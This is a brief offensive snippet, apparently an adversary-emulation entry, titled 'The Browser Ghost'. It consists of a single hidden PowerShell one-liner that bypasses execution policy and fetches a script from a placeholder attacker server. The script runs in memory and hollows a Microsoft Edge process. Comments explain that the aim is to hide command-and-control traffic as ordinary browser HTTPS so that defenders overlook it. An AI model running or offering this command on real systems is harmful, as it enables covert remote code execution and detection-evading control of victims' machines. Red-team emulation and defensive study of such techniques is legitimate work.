# The Browser Ghost: Targeting msedge.exe for C2 Evasion

# This command leverages PowerShell to perform in-memory hollowing of a Microsoft Edge process. By using a browser as the host, any subsequent network traffic generated by the payload is more likely to be dismissed by defenders as standard HTTPS browsing.
# Command: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$src = Invoke-RestMethod '#{server.malicious.url}/Invoke-BrowserGhost.ps1'; Invoke-Expression $src; Invoke-BrowserGhost -Target 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'"

